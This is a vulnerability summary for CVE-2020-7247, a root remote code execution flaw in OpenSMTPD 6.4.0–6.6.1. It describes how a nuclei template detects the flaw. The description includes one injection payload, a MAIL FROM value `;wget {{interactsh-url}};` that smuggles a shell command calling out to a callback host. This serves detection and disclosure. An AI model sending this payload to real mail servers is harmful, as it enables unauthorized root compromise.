---
cve_id: CVE-2020-7247
template_path: nuclei-templates/javascript/cves/2020/CVE-2020-7247.yaml
affected_product: OpenSMTPD
severity: critical
authentication: none
external_callback: true
affected_versions: 6.4.0 - 6.6.1
preconditions: uncommented default configuration
poc_classification: rce
---

## Vulnerability
OpenSMTPD versions 6.4.0 - 6.6.1 (as used in OpenBSD 6.6 and other products) contain a remote code execution flaw in `smtp_mailaddr` within `smtp_session.c`. Remote attackers can execute arbitrary commands as root by injecting shell metacharacters into the MAIL FROM field of a crafted SMTP session. The root cause is an incorrect return value upon failure of input validation. This affects only the "uncommented" default configuration.

**CVSS 3.1 Score**: 9.8 (Critical) â€“ AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  
**CWE**: 755  
**Impact**: Attacker gains root-level arbitrary code execution with OpenSMTPD process privileges, enabling full system compromise.  
**Remediation**: OpenBSD users should install patches for OpenBSD 6.6 (or upgrade OpenSMTPD).

## PoC / Detection
Classification: rce

The template first verifies the target port is open, then uses the nuclei SMTP client library to connect on port 8825. It constructs an SMTPMessage with a malicious From address set to `;wget {{interactsh-url}};`, sends the message to "root", and confirms exploitation success by matching a DNS-based interactsh callback together with a successful send result.

## References
- https://www.openwall.com/lists/oss-security/2020/01/28/3
- https://nvd.nist.gov/vuln/detail/CVE-2020-7247
- https://github.com/openbsd/src/commit/9dcfda045474d8903224d175907bfc29761dcb45
- http://www.openwall.com/lists/oss-security/2020/01/28/3
- http://packetstormsecurity.com/files/156145/OpenSMTPD-6.6.2-Remote-Code-Execution.html
